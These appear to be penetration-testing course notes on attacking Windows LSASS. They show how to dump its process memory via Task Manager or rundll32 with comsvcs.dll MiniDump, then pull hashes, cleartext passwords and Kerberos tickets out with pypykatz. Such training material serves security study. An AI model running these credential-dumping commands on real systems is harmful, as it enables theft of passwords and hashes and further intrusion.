---
description: Local Security Authority Subsystem Service
---

# Attacking LSASS

### Dumping LSASS Process Memory

**Task Manager Method**

![Task Manager Memory Dump](https://academy.hackthebox.com/storage/modules/147/taskmanagerdump.png)

The file will be saved in the following location.

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

**Rundll32.exe & Comsvcs.dll Method**

```powershell-session
PS C:\Windows\system32> Get-Process lsass
```

**Creating lsass.dmp using PowerShell**

```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

**Using Pypykatz to Extract Credentials**

```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

The output will have the following sections that we need to focus

<table><thead><tr><th width="125">Sections</th><th>Descriptions</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a></td><td><a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the <code>SID</code>, <code>Username</code>, <code>Domain</code>, and even the <code>NT</code> &#x26; <code>SHA1</code> password</td></tr><tr><td>WDIGEST</td><td><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text.</td></tr><tr><td><a href="https://web.mit.edu/kerberos/#what_is">Kerberos</a></td><td>Network authentication protocol used by Active Directory in Windows Domain environments. LSASS <code>caches passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos</td></tr><tr><td>DPAPI</td><td>set of APIs in Windows operating systems used to encrypt and decrypt DPAPI data blobs on a per-user basis for Windows OS features and various third-party applications</td></tr></tbody></table>



